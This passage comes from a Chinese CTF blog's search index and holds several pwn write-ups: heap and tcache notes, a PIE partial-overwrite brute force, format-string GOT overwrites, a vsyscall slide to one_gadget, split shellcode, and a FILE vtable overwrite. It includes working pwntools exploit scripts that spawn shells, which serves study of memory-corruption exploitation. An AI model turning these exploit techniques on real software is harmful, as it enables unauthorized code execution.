sla(\">\", str(Type))\n\ndef exit(con):\n    sla(menu,\"4\")\n    #sa(\"at last?\\n\",con)\n\n\nadd(1,\"B\")\ndelete(1)\n\nfor i in range(0,5):\n    add(2,\"A\")\n    delete(1)\n\nshow(1)\nru(\"type inode number :\")\nheap_low_four = int(ru(\"\\n\"))\nif(heap_low_four<0):\n    heap_low_four += 0x100000000\nlog.info(\"heap_low_four:0x%x\"%heap_low_four)\n\nfor i in range(0,3):\n    add(1,str(heap_low_four))\n    delete(2)\n\nadd(2,str(heap_low_four-0x10))\nadd(2,str(heap_low_four-0x10))\nadd(2,str(0x4b1))\n\n#fill\nfor i in range(0,32):\n    add(2,str(0x51))\n\ndelete(2)\nadd(1,str(heap_low_four))\nadd(1,str(heap_low_four))\ndelete(1)\nshow(1)\nru(\"type inode number :\")\n\nmalloc_hook = int(ru(\"\\n\"))- 96 - 0x10\nobj = LibcSearcher(\"__malloc_hook\", malloc_hook)\n\nlibc_base_four = malloc_hook - obj.dump('__malloc_hook')\nif(libc_base_four<0):\n    libc_base_four += 0x100000000\nheap_base = heap_low_four-0x260\nlog.info(\"libc_base_four:0x%x\"%libc_base_four)\n__IO_2_1_stdin_fileno_addr = libc_base_four+obj.dump(\"_IO_2_1_stdin_\")+0x70\n\nadd(1,str(malloc_hook+0x10+96))\ndelete(2)\nadd(2,str(heap_base+0x50+0x8))\nadd(2,str(__IO_2_1_stdin_fileno_addr))\nadd(2,str(__IO_2_1_stdin_fileno_addr))\nadd(1,str(666))\n\npause()\n\np.sendline(\"4\")\np.interactive()\n```\n\n这里我都是int_chunk拿来泄露地址和利用，short_chunk来打辅助。\n\n★另外记录下tcache方面的，tcache根源在于tcache结构体，所以如果tcache的bin中如下：\n\n0x20[]:chunkA->chunkA.fd=1\n\n那么如果这时候申请chunkA的同时修改chunkA.fd=2，对于的tcache的bin中只会是：\n\n0x20[]:chunkA.fd=1，而不是chunkA.fd=2，因为在malloc时就已经将chunkA.fd=1放到tcache结构体中了，再修改chunkA.fd是没有意义的，只能修改tcache结构体才行。\n\n★还有tcache的cout字段一直是个谜，如果cout>7，tcache的max宏定义没有被改，那么释放后的chunk是不会进入对于的tcache的bin中。但是如果cout<7或者<0，是不会有其他影响的，只会看tcache结构体中对应bin的链表中是不是0x0。是就当没有，有数据则就有chunk在该bin中，不管cout是多少(<7)，并且malloc或者free后会对cout对应加减。(不同libc版本好像又不太一样，具体调试)\n","tags":["刷题"],"categories":["PWN"]},{"title":"DefCamp CTF Finals 2016-SMS","url":"/2021/08/14/DefCamp CTF Finals 2016-SMS/","content":"\n1.常规checksec操作，开了PIE和NX，首先shellcode不能用。其次PIE表示地址随机化，也就是没办法覆盖返回地址来直接跳转到我们想要的函数处。IDA打开找漏洞，可以看到在doms函数中的v1的栈地址被传递给set_user和set_sms\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191528555.jpeg)\n\n之后set_user中会读取输入保存在S这个栈地址上，然后从s中读取前四十个字节到a1[140]-a1[180]，这个a1就是doms函数中的v1。\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191528927.jpeg)\n\n再往后看，在set_sms函数中，同样读取1024个字节到S这个栈变量中，并且最后将S的特定长度strncpy给a1，这个特定长度就是a1[180]。所以这里我们可以通过set_user来控制a1[180]，进而控制set_sms函数中strncpy给a1拷贝的长度，也就是doms函数中v1的长度，使其大于v1距离栈底的距离0xc0，从而在doms函数栈中执行栈溢出，而doms函数中的v1也就是a1，是在set_sms中由我们输入到S上的内容拷贝过去的，长度为0x400，完全可控。\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191527621.jpeg)\n\n另外程序存在后门frontdoor()，只要进入这个函数，再输入binsh字符串就能getshell。\n\n2.所以现存在doms函数栈溢出，后门函数这两个漏洞，但是由于PIE，在程序运行过程中没办法确定frontdoor()的地址，无法直接覆盖doms函数返回地址到达后门函数\n\n3.这里就需要用到内存页的一个知识点，由于一个内存页的大小为0x1000，而frontdoor()函数和dosms函数和main函数等等函数，都在同一个内存页上，所以在64位程序下他们的函数地址都是0x############x***这种类型，前面12位#每次加载都不一样，而后面的三位***不会发生改变，因为都在0x0000563cc913(x)000 - 0x0000563cc913(x+1)000这个内存页上。用IDA打开按ctrl+s可以看到\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191527058.png)\n\n这些段都在0x0000563cc913(x)000 - 0x0000563cc913(x+1)000这个内存页上。而开启了PIE程序的，0000563cc913(x)这个数值每次都会变化，但是最后三位是不会改变的，就是固定相对于这个内存页起始位置的偏移。\n\n4.所以覆盖返回地址时，可以想到，dosms函数的返回地址是call dosms下一条指令，也就是在main函数上，而frontdoor函数的地址与main函数的地址都在0x0000563cc913(x)这个内存页上。所以当程序被加载，0x0000563cc913(x)这个数值发生改变时，frontdoor函数和main函数地址中对应的数值也会相应改变，而且都是一样的。这种情况下，就可以通过修改dosms返回地址的后四位，也就是之前的(x)yyy来跳转到frontdoor。\n\n5.如果直接爆破，按照数学期望需要尝试0xffff+1=65535+1这么多次，太巨大。这里又考虑到yyy时不会改变的，所以用IDA可以看到frontdoor函数的后三位地址为900，我们在写payload的时候直接写入即可，就是PIE也不会发生改变。现在唯一不确定的就是(x)yyy中的x。直接爆破就好，平均尝试的数学期望为f+1=16次，也不算太高。\n\n6.所以尝试写payload:\n\n(1)修改set_user中的a1[180]的值：\n\n```\n#注释头\n\ndef setlength():\n    io.recvuntil('> ')\n    payload_setlength = 'a'*40 #padding\n    payload_setlength += '\\xca' \n    io.sendline(payload_setlength)\n```\n\n(2)执行栈溢出，覆盖返回地址的低两个字节为\"\\x(x)9\"和\"\\x01\"(大端序，注意顺序)\n\n```\n#注释头\n\ndef StackOverflow():\n    io.recvuntil('> ')\n    payload_StackOverflow = 'a'*200 #padding\n    payload_StackOverflow += '\\x01\\xa9' \n    #frontdoor的地址后三位是0x900, +1跳过push rbp，影响\n    io.sendline(payload_StackOverflow)\n```\n\n这里跳过push rbp的原因是因为strncpy的关系，如果发送的是\\x00,\\xa9，那么先复制\\x00，则会由于strncpy的机制提前结束复制，造成a9没办法复制进去，从而程序出错。(发送的由于是fget函数，所以会全盘接受，\\x00也会接受，不是读取函数的原因。)而跳过push rbp并不影响frontdoor里面的函数执行，所以不会影响getshell。\n\n(3)由于每次地址随机，所以地址随机成a900的概率为1/16，那么就考虑用自动化来爆破实施：\n\n```\n#注释头\n\ni = 0\nwhile True:\n    i += 1\n    print i\n    io.remote(\"127.0.0.1\",0000)\n    setlength()\n    StackOverflow()\n    try:\n        io.recv(timeout = 1) \n        #要么崩溃要么爆破成功，若崩溃io会关闭，io.recv()会触发   EOFError\n    except EOFError:\n        io.close()\n        continue\n    else:\n        sleep(0.1)\n        io.sendline('/bin/sh\\x00')\n        sleep(0.1)\n        io.interactive() #没有EOFError的话就是爆破成功，可以开shell\n        break\n```\n\n▲如果直接process本地则没办法成功运行，需要用socat转发，用127.0.0.1本地连接才可以。\n\n \n\n参考资料：\n\nhttps://bbs.ichunqiu.com/forum.php?mod=collection&action=view&ctid=157\n","tags":["PIE"],"categories":["PWN","PIE0x7"]},{"title":"Format_x86和format_x64","url":"/2021/08/14/Format_x86和format_x64/","content":"\n★32位程序：\n\n1.常规checksec，只开了NX。打开IDA查漏洞，main函数中格式化字符串漏洞：\n\n```\n#注释头\n\nmemset(&buf, 0, 0x12Cu);\nread(0, &buf, 0x12Bu);\nprintf(&buf);\n```\n\n2.这里会有一个重复读取的循环，开shell需要system函数和binsh字符串，这里只有system函数，got和plt都对应有，没有binsh字符串，没有libc。\n\n3.由于printf漏洞，我们可以利用这个漏洞向指定的内存地址写入指定的内容，这里考虑将printf的got中的值更改system函数plt表项的值。原本如果调用printf函数，则相当于执行printf函数的got表中保存的printf函数的真实地址处的代码，更改之后相当于执行system函数plt表地址处的代码，也就相当于调用system函数。原理如下：\n\n原本执行Printf函数：相当于执行printf的执行代码\n\n```\n#注释头\n\nprintf_got_addr:   7Fxxxxxx\n7Fxxxxxx:          printf的执行代码\n```\n\n更改之后：相当于执行jmp system_got代码，那就相当于执行system函数了\n\n```\n#注释头\n\nprintf_got_addr:          08048320(system_plt)\n08048320(system_plt):     jmp system_got\n```\n\n4.那么预想程序总流程如下：第一次读取，输入payload，然后printf执行，将printf的got表更改为system函数plt表。通过while循环，第二次读取，输入binsh字符存入buf中，此时printf(&buf)，相当于system(&buf)，那就相当于system(binsh)，即可直接getshell。\n\n5.编写payload，首先需要计算一下偏移地址，将断点下在call printf上，通过调试能够查看到printf写入栈中的地址距离esp的偏移量为6，所以使用控制字符%n来将printf劫持到system，这里偏移就会成n-1为5。偏移代表的是取参数的时候的偏移量，下面的payload对应的5，6，7，8就对应向地址print_got，print_got+1，print_got+2，print_got+3写入内容。由于是修改地址，所以用%hhn来逐个修改，防止向服务器发送过大数据从而出错。\n\n(1)找到got表和plt表项的值\n\n```\n#注释头\n\nprintf_got = 0x08049778\nsystem_plt = 0x08048320\n```\n\n(2)32位程序，4个字节一个地址，所以需要四个地址：\n\n```\n#注释头\n\npayload = p32(printf_got)\npayload += p32(printf_got+1)\npayload += p32(printf_got+2)\npayload += p32(printf_got+3)\n```\n\n(3)由于是大端序，低地址保存的是高地址的内容，print_got需要保存的应该是system_plt的最后一个字节，也就是0x20。\n\n①由于前面已经输入了p32(printf_got)+p32(printf_got1)+p32(printf_got2)+p32(printf_got3)，这些在没有遇到%之前一定会被打印出来，共计16个字节，而我们需要让它总共打印出0x20个字节，所以我们再打印(0x20-16)个字节。\n\n②同样，由于前面已经打印了0x20个字节，我们总共需要打印0x83个字节，所以应该再让程序打印%(0x83-0x20)个字节，之后道理相同。\n\n```\n#注释头\n\n\npayload += \"%\"\npayload += str(0x20-16)\npayload += \"c%5$hhn\"\n#写入0x20到地址print_got\n\npayload += \"%\"\npayload += str(0x83-0x20)\npayload += \"c%6$hhn\"\n#写入0x83到地址print_got+1\n\npayload += \"%\"\npayload += str(0x104-0x83)\npayload += \"c%7$hhn\"\n#写入0x04到地址print_got+2，0x104被截断为04\n\npayload += \"%\"\npayload += str(0x108-0x104)\npayload += \"c%8$hhn\"\n#写入0x08到地址print_got+3，0x108被截断为08\n```\n\n▲为了便于理解，下面代码也行：\n\n```\n#注释头\n\npayload = p32(printf_got+1) \n#使用hhn写入，分别对应待写入的第3，4，2，1字节\npayload += p32(printf_got)\npayload += p32(printf_got+2)\npayload += p32(printf_got+3)\n\npayload += \"%\"\npayload += str(0x83-16) #被写入的数据，注意四个地址长度是16，需要减掉\npayload += \"c%5$hhn\"\n\npayload += \"%\"\npayload += str(0x120-0x83)\npayload += \"c%6$hhn\"\n\npayload += \"%\"\npayload += str(0x204-0x120) #由于是hhn所以会被截断，只留后两位\npayload += \"c%7$hhn\"\n\npayload += \"%\"\npayload += str(0x208-0x204)\npayload += \"c%8$hhn\"\n```\n\n6.其实可以直接使用类Fmtstr，效果一样，将Payload替换成下列代码即可\n\npayload = fmtstr_payload(5, {printf_got:system_plt})\n\n7.之后再io.sendline('/bin/sh\\x00')，即可getshell\n\n \n\n★64位程序\n\n1.由于64位，传参的顺序为rdi, rsi, rdx, rcx, r8, r9，接下来才是栈，所以偏移量应该是6指向栈顶。之后考虑使用fmtstr来直接构造获取：\n\npayload = fmtstr_payload(6, {printf_got:system_plt})\n\n但是这个方法会出错，因为在这种情况下，我们的地址如下\n\n```\n#注释头\n\nprintf_got = 0x00601020\nsystem_plt = 0x00400460\n```\n\n需要写入地址printf_got的首两位是00，且以p64形式发送，所以先发送的是0x20，0x10，0x60，0x00，0x00.......而Read函数读到0x00就会截断，默认这是字符串结束了，所以之后的都无效了。\n\n2.那么考虑手动方式，将p64(printf_got)放在payload的末尾，这样就只有最后才会读到0x00，其它的有效数据都能读入。\n\n3.使用手动方式就需要再次计算偏移量，我们的payload构成应该是\n\npayload = ”%”+str(system_plt)+”c%8$lln” + p64(printf_got)\n\n这里偏移量为8是因为经过调试发现我们的输入从栈顶开始计算，也就是从栈顶开始，一共输入了\n\n1(%) + 7(0x400460转换成十进制为4195424，也就是7个字节) + 7(“c%8$lln”) + 8(p64_printf_got)=23个字节。\n\n经过计算我们发现，p64前面的字节数为15个字节，不足8的倍数，这样会导致printf_got的最后一个字节20被截断至偏移量为7的位置，从而使得偏移量为8的位置只有6010，导致出错。所以我们需要填充一个字节进去，让它不会被截断。\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191543645.png)\n\n```\n#注释头\n\npayload = ”a%” + str(system_plt-1)+”c%8$lln” + p64(printf_got)\n```\n\n加入一个字节a就可以使得在参数偏移量为6和7的位置中不会截断0x601020。同时加入字节a就要使system_plt-1来满足最终打印的字符个数为0x00400460，从而才能成功将0x00400460(system_plt)写入到0x00601020(printf_got)\n\n5.完成payload之后，再次循环进入，输入io.sendline('/bin/sh\\x00')后interactive()即可getshell\n\n参考资料：\n\nhttps://bbs.ichunqiu.com/forum.php?mod=collection&action=view&ctid=157\n","tags":["Fmstr"],"categories":["PWN","Fmstr0x6"]},{"title":"HITB GSEC CTF 2017-1000levels","url":"/2021/08/14/HITB GSEC CTF 2017-1000levels/","content":"\n1.与之前BCTF 2017-100levels一模一样，只不过最大值变成了1000关，所以这里也同样可以用爆破来做，但是可以用另一种方法，vsyscall。\n\n2.进入IDA可以看到有一个hint函数，而且里面有system函数，但是很奇怪：\n\n```\n#注释头\n\nsprintf((char *)&v1, \"Hint: %p\\n\", &system, &system);\n```\n\n这个代码没怎么看懂，还是看下汇编代码：\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191531418.jpeg)\n\n这里就是将system的地址赋值给rax，然后rax给栈上的[rbp+var_110]赋值。之后也没有什么其它的更改栈上[rbp+var_110]的操作，所以进入hint函数之后，一定会将system函数放到栈上，通过调试也可以看出来。\n\n3.之后进入go函数，发现如果第一次输入负数，原本将关卡数赋值给[rbp+var_110]的操作就不会被执行，那么[rbp+var_110]上保存的仍然是system函数的地址。之后再输入关卡数，直接加到[rbp+var_110]上，那么如果第一次输入负数，第二次输入system函数和one_gadget的偏移，那么就变相将[rbp+var_110]上存放的内容保存为one_gadget的地址。\n\n▲这里需要注意的是，[rbp+var_110]是在hint函数中被赋值的，而go函数中用到的也是[rbp+var_110]这个变量，但是不同函数栈肯定是不同的，所以这里两个[rbp+var_110]是不是一样的就值得思考一下。看程序可以发现，hint函数和go函数都是在main函数中调用的，那么如果调用的时候两处的rsp是一样的就可以保证两个函数的rbp一样，也就代码[rbp+var_110]也是一样的。查看汇编代码：\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191531579.jpeg)\n\n可以看到从读取选项数据之后，到判断语句一直没有push,pop之类的操作，也就是说程序无论是运行到hint函数还是go函数时，main函数栈的状态都是一样的，从而导致进入这两个函数中的栈底也都是同一个地址，那么[rbp+var_110]也就一样，所以用hint函数来为[rbp+var_110]赋值成system函数，再用go函数来为[rbp+var_110]赋值为one_gadget这条路是可以的，同样可以调试来确定一下。\n\n4.那么赋值之后进入level关卡函数，由于递归关系，最后一关的栈是和go函数的栈连在一起的，所以可以通过最后一关的栈溢出抵达go函数的栈，从而抵达[rbp+var_110]这个地址处。\n\n5.但是栈溢出只能修改数据，就算控制eip，但是也并不知道[rbp+var_110]处的真实地址，只能通过调试来知道偏移是多少。所以这里需要用的vsyscall来将rsp下挪到[rbp+var_110]处从而执行vsyscall的ret操作来执行[rbp+var_110]处的代码，也就是one_gadget。\n\n6.这里看一下vsyscall处的数据：\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191531595.png)\n\n▲vsyscall的特点：\n\n(1)某些版本存在，需要用到gdb来查看，IDA中默认不可见。\n\n(2)地址不受到ASLR和PIE的影响，固定是0xffffffffff600000-0xffffffffff601000。\n\n(3)不能从中间进入，只能从函数开头进入，意味着不能直接调用里面的syscall。这里vsyscall分为三个函数，从上到下依次是\n\nA.gettimeofday: 0xffffffffff600000\n\nB.time: 0xffffffffff600400\n\nC.getcpu: 0xffffffffff600800\n\n(4)gettimeofday函数执行成功时返回值就是0，保存在rax寄存器中。这就为某些one_gadget创造了条件。\n\n7.观察代码可以发现，三个函数执行成功之后相当于一个ret操作，所以如果我们将gettimeofday放在eip处，那么就相当于放了一个ret操作上去，而ret操作又相当于pop  eip，那么就相当于直接将rsp往下拉了一个单位。如果我们多次调用gettimeofday，那么就可以将rsp下拉多个单位，从而抵达我们想要的地方来执行代码。那么这里就可以将eip改成gettimeofday，然后在之后添加多个gettimeofday来滑到one_gadget来执行代码。\n\n8.所以现在就可以编写exp了\n\n(1)前置内容：\n\n```\n#注释头\n\nlibc_system_offset = 0x432C0\t\t\t\t\t\n#减去system函数离libc开头的偏移\none_gadget_offset = 0x43158\t\t\t\t\n#加上one gadget rce离libc开头的偏移\nvsyscall_gettimeofday = 0xffffffffff600000\n\nio.recvuntil('Choice:')\nio.sendline('2') #让system的地址进入栈中\nio.recvuntil('Choice:')\nio.sendline('1') #调用go()\nio.recvuntil('How many levels?')\nio.sendline('-1') #输入的值必须小于0，防止覆盖掉system的地址\nio.recvuntil('Any more?')\nio.sendline(str(one_gadget_offset-libc_system_offset))\t\t\n#第二次输入关卡的时候输入偏移值，从而通过相加将system的地址变为one gadget rce的地址\n```\n\n这里由于相加关系，levels=system_addr + one_gadget_offset - libc_system_offset,肯定超过999，所以关卡数一定是1000关。\n\n(2)开始循环答题，直至到达最后一关执行栈溢出：\n\n```\n#注释头\n\ndef answer():\n    io.recvuntil('Question: ') \n    answer = eval(io.recvuntil(' = ')[:-3])\n    io.recvuntil('Answer:')\n    io.sendline(str(answer))\nfor i in range(999): #循环答题\n    log.info(i)\n    answer()\n```\n\n(3)最后一关执行栈溢出，利用gettimeofday滑至one_gadegt从而getshell。\n\n```\n#注释头\n\nio.recvuntil('Question: ')\nio.send(b'a'*0x38 + p64(vsyscall_gettimeofday)*3)\nio.interactive()\n```\n\n▲以下是测试[rbp+var_110]的数据：\n\nmain函数中的rbp:  00007FFD3A854900\n\nhint函数中的rbp:   00007FFD3A8548C0\n\ngo函数中的rbp:    00007FFD3A8548C0\n\n▲vsyscall用法:\n\nvsyscall直接进行syscall，并没有利用栈空间，所以在处理栈溢出，但是由于PIE没有别的地址可以用时，而栈上又有某个有用的地址的时候，可以通过vsyscall构造一个rop链来ret，每次ret都会消耗掉一个地址，将rsp下拉一个单位，这样就可以逐渐去贴近想要的那个地址，最后成功ret到相应的位置。\n\n▲vdso的特点：\n\n(1)vdso的地址随机化的，且其中的指令可以任意执行，不需要从入口开始。\n\n(2)相比于栈和其他的ASLR，vdso的随机化非常的弱，对于32的系统来说，有1/256的概率命中。\n\n(3)不同的内核随机程度不同：\n\nA.较旧版本：`0xf76d9000`-`0xf77ce000`\n\nB.较新版本：`0xf7ed0000`-`0xf7fd0000`\n\nC.其它版本：\n\n可以编译以下文件之后用脚本查看：\n\n```\n//注释头\n\n// compiled: gcc -g -m32 vdso_addr.c -o vdso_addr\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n\nint main()\n{\n    printf(\"vdso addr: %124$p\\n\");//这里的偏移不同内核不一样，可调试一下看看。\n    return 0;\n}\n```\n\n查看脚本：\n\n\\#注释头\n\n```\n#!/usr/bin/python\n# -*- coding:utf-8 -*-\n\nimport os\n\nresult = []\nfor i in range(100):\n    result += [os.popen('./vdso_addr').read()[:-1]]\n\nresult = sorted(result)\n\nfor v in result:\n    print (v)\n```\n\n▲vdso的用法：与vsystem类似，泄露出地址后相当于有了syscall。另外32位条件下有__kernel_rt_sigreturn，可以打SROP。\n\n \n\n \n\n参考资料：\n\nhttps://bbs.ichunqiu.com/forum.php?mod=collection&action=view&ctid=157\n\nhttps://xz.aliyun.com/t/5236\n\n \n","tags":["PIE"],"categories":["PWN","PIE0x7"]},{"title":"CSAW Quals CTF 2017-pilot","url":"/2021/08/14/CSAW Quals CTF 2017-pilot/","content":"\n \n\n1.常规check，发现这破程序啥保护也没开，而且还存在RWX段：\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191555089.jpeg)\n\n这不瞎搞嘛。之后IDA找漏洞，发现栈溢出：\n\n```\n#注释头\n\nchar buf; // [rsp+0h] [rbp-20h]\nif ( read(0, &buf, 0x40uLL) > 4 )：\n```\n\n2.这里就可以思考下攻击思路，存在栈溢出，还有RWX段，考虑用shellcode。虽然这个RWX段是随机生成的栈，地址没办法确定。再看看程序，发现程序自己给我们泄露了buf的栈地址：\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191555043.jpeg)\n\n也就是说紧跟再location后面的打印出来的就是buf的真实栈地址，这样我们就可以接受该栈地址，然后用栈溢出使得我们的main函数返回时可以跳转到对应的buf地址上，而buf地址上的内容就是我们的输入，也就是输入的shellcode，这样就可以执行我们的shellcode了。\n\n3.但是写完shellcode会发现程序崩溃，这里进入IDA调试一下shellcode。可以发现程序运行过程中，Main函数return执行之后，跳转到shellcode的地方，然后运行shellcode。但是这一过程中，栈顶指向了main函数return的地址。所以在运行shellcode过程中，由于shellcode中有一个push rbx命令，导致rsp向上移动8个字节会覆盖掉shellcode的首地址。本来这没啥事，毕竟已经进入到shellcode当中去了，但是后面还有push rax和push rdi这两个改变rsp的命令，这就导致了rsp再次向低地址覆盖了16个字节，总共覆盖了24个字节。但是我们输入的shellcode有48个字节，顺序为shellcode+nop*10+addr_shellcode，也就是扣掉最后18个字节，还多出来6个字节覆盖掉了我们的执行代码shellcode的最后6个字节代码，导致我们的shellcode没办法完全执行，最终导致程序出错。\n\n4.由于read函数允许我们输入0x40，也就是64个字节，也就是在覆盖掉返回地址之后，我们还能再输入64-48=16个字节。由于push rdi之后的片段为8个字节(包括了push rdi)，小于16个字节，能够容纳下我们被覆盖掉的shellcode的代码，所以这里我们可以考虑用拼接的方式来把shellcode完美执行。\n\n5.现在考虑如何把两段shellcode汇编代码连在一起。有call,return和jmp，但是前面两条指令中，call会push进函数地址，而return也会修改栈和寄存器的状态，ret指令的本质是pop eip，即把当前栈顶的内容作为内存地址进行跳转。所以只能选择jmp跳转。\n\n6.可以查阅Intel开发者手册或其他资料找到jmp对应的字节码，或者这个程序中带了一条Jmp可以加以利用。为EB，jmp x总共2个字节：EB x.\n\n7.将两段隔开，从push rdi开始，将push rdi和之后的代码都挪到下一个地方。这时第一段shellcode应该是22+2(jmp x)=24个字节，距离下段shellcode的距离应该是48-24=24，也就对应0x18h，所以总的shellcode应该是shellcode1+EB 18h+shellcode2，这样可以顺利执行需要的shellcode。\n\n \n\n \n\n▲jmp的跳转计算距离是从jmp指令下一条开始计算的。\n\n▲shellcode的两段执行：\n\n1.需要泄露地址，读取泄露地址：\n\nA.print io.recvuntil(\"Location:\")#读取到即将泄露地址的地方。\n\nB.shellcode_address_at_stack = int(io.recv()[0:14], 16)#将泄露出来的地址转换为数字流\n\nC.log.info(\"Leak stack address = %x\", shellcode_address_at_stack)#将泄露地址尝试输出，观察是否泄露成功。\n\n2.需要跳转jmp命令或者是return/call，但是return会pop eip，call会push eip，都会修改掉栈中的内容。如果shellcode的两段执行计算偏移地址的话，可能需要将这两个内容也计算进入。但是jmp就不会需要，是直接无条件跳转，所以大多时候选择jmp比较好。\n\n \n\n参考资料：\n\nhttps://bbs.ichunqiu.com/forum.php?mod=collection&action=view&ctid=157\n","tags":["shellcode"],"categories":["PWN","Shellcode0x2"]},{"title":"HCTF2018_the_end","url":"/2021/08/14/HCTF2018_the_end/","content":"\n1.常规checksec，除了canary之外保护全开。IDA打开找漏洞，没什么漏洞，就是程序会泄露出sleep的地址，然后让我们在任意地方写入5个字节，并且给了libc文件，那么就可以算出libc基地址，版本为2.23。\n\nprintf(\"here is a gift %p, good luck ;)\\n\", &sleep);\n\n2.程序最后调用exit(1337)，两种方法：\n\n(1)exit会无条件通过_IO_2_1_stdout_结构体调用vtable虚表中的_setbuf函数。\n\n(2)exit会通过_IO_2_1_stdout_结构体调用vtable虚表中的_overflow函数，但需要满足以下条件：\n\n```\n#注释头\n\n_IO_FILE_plus._mode <= 0\n_IO_FILE_plus._IO_write_ptr > _IO_FILE_plus._IO_write_base\n```\n\n所以我们伪造的_IO_FILE_plus结构体就需要满足上述条件\n\n(3)exit会调用_rtld_global结构体中的_dl_rtld_lock_recursive函数，不用满足条件。\n\n3.三种方法攻击思路:\n\n(1)由于会调用_setbuf函数，vtable位于libc数据段上不可写部分，无法直接修改vtable对应的_IO_file_jumps中的函数指针。那么可以伪造_IO_2_1_stdout_中的vtable指针，利用2字节修改vtable指针的倒数两个字节，使其指向一个可读可写内存，形成一个fake_IO_file_jumps，然后在该内存对应_setbuf函数偏移处伪造one_gadget地址。\n\n```\nfrom pwn import *\nlibc=ELF(\"/lib/x86_64-linux-gnu/libc-2.23.so\")\np = process('./the_end')\n\nvtable_offset = 0xd8\n_setbuf_offset = 0x58\nfake_vtable_offset = 0x3c5588\n#这个需要自己调试找，并保证偏移_setbuf_offset处修改之后程序不会直接崩溃\n\nsleep_addr = p.recvuntil(', good luck',drop=True).split(' ')[-1] \nlibc_base = long(sleep_addr,16) - libc.symbols['sleep']\n\none_gadget = libc_base + 0xf02b0\n_IO_2_1_stdout_vtable_addr = libc_base + libc.sym['_IO_2_1_stdout_'] + vtable_offset\n\nfake_vtable = libc_base + fake_vtable_offset\nfake_vtable_setbuf_addr = libc_base + fake_vtable_offset + _setbuf_offset\n\nprint 'libc_base: ',hex(libc_base)\nprint 'one_gadget:',hex(one_gadget)\n\nfor i in range(2):\n    p.send(p64(_IO_2_1_stdout_vtable_addr+i))\n    p.send(p64(fake_vtable)[i])\n\nfor i in range(3):\n    p.send(p64(fake_vtable_setbuf_addr+i))\n    p.send(p64(one_gadget)[i])\n\np.sendline(\"exec /bin/sh 1>&0\")\n\np.interactive()\n```\n\n \n\n(2)_IO_FILE_plus结构体位于libc数据段上可读可写内存处，可以直接修改，但是修改字节数只有5个，按照第一种方法：\n\n```\n#注释头\n\n_IO_FILE_plus._mode <= 0  //该条件自动就会满足\n_IO_FILE_plus._IO_write_ptr > _IO_FILE_plus._IO_write_base//该条件需要设置1个字节\n```\n\n再利用1个字节修改vtable的倒数第二个字节，伪造vtable指针，然后利用3个字节在该内存对应_setbuf函数偏移处伪造one_gadget地址。\n\n(3)_rtld_global结构体位于libc数据段上可读可写内存处，可以直接修改。那么直接修改_dl_rtld_lock_recursive函数指针指向one_gadget就行了。\n\n \n\n方法(2)和方法(3)参考：\n\nhttps://blog.csdn.net/Mira_Hu/article/details/103736917\n\n \n\n参考资料：\n\nhttps://wiki.x10sec.org/pwn/linux/io_file/fake-vtable-exploit-zh/\n\n \n","tags":["First"],"categories":["PWN","FSOP0xe"]},{"title":"LCTF 2016-pwn100_without_libc","url":"/2021/08/14/LCTF 2016-pwn100_without_libc/","content":"\n1.与之前做的pwn100一模一样，只是之前有给Libc，这次没给Libc。栈溢出，选择用Puts函数来泄露地址从而再执行栈溢出来重复使用。\n\n2.编写leak函数，由于用Puts函数打印，所以需要有个循环条件，具体原因可以查看之前写的。\n\n```\n#注释头\n\ndef leak(addr):\n    count = 0\n    up = ''\n    content = ''\n    payload = 'A'*72 #padding\n    payload += p64(pop_rdi) #给puts()赋值\n    payload += p64(addr) #leak函数的参数addr\n    payload += p64(puts_addr) #调用puts()函数\n    payload += p64(start_addr) #跳转到start，恢复栈\n    payload = payload.ljust(200, 'B') #padding\n    io.send(payload)\n    io.recvuntil(\"bye~\\n\")\n    while True: #无限循环读取，防止recv()读取输出不全\n        c = io.recv(numb=1, timeout=0.1) #每次读取一个字节，设置超时时间确保没有遗漏\n        count += 1\n        if up == '\\n' and c == \"\": #上一个字符是回车且读不到其他字符，说明读完了\n            data = data[:-1]+'\\x00' #最后一个字符置为\\x00\n            break\n        else:\n            data += c #拼接输出\n            up = c #保存最后一个字符\n    data = data[:4] #截取输出的一段作为返回值，提供给DynELF处理\nlog.info(\"%#x => %s\" % (addr, (data or '').encode('hex')))\nreturn data\n```\n\n3.得到system_addr的地址后，后续的操作用万能gadget和read函数即可实现。如果还需要其它地址，也可以通过此方法来打印，也是一样的。\n\n(参照之前不给Libc的pwn100)\n\n \n\n参考资料：\n\nhttps://bbs.ichunqiu.com/forum.php?mod=collection&action=view&ctid=157\n","tags":["Fmstr"],"categories":["PWN","Fmstr0x6"]},{"title":"Learn_malloc.c_before","url":"/2021/08/14/Learn_malloc.c_before/","content":"\n一、环境部署：\n\n```\n#注释头\n\ndocker pull ubuntu:16.04\ndocker pull ubuntu:18.04\ndocker pull ubuntu:20.04\n```\n\n二、环境安装:\n\n1.apt换源，docker换源，pip换源。\n\n2.安装前置包：\n\n```\n#注释头\n\nsudo apt-get install libxml2-dev\nsudo apt-get install libxslt-dev\nsudo apt-get install libmysqlclient-dev\nsudo apt-get install libsqlite3-dev\nsudo apt-get install zlib1g-dev\nsudo apt-get install python-dev\nsudo apt-get install libffi-dev\nsudo apt-get install libssl-dev\n```\n\n3.安装python好多步部曲：\n\n```\n#注释头\n\nwget https://www.python.org/ftp/python/2.7.9/Python-2.7.9.tgz\n(wget https://www.python.org/ftp/python/3.9.0/Python-3.9.0.tgz)\ntar -zxvf Python-2.7.9.tgz\ncd Python-2.7.9\n./configure --prefix=/usr/local/python27\nmake\nmake install\nln -s /usr/local/python27/bin/python /usr/bin/python2\n```\n\n4.安装setuptools四部曲：\n\n```\n#注释头\n\nwget https://pypi.python.org/packages/45/29/8814bf414e7cd1031e1a3c8a4169218376e284ea2553cc0822a6ea1c2d78/setuptools-36.6.0.zip#md5=74663b15117d9a2cc5295d76011e6fd1\nunzip setuptools-36.6.0.zip\ncd 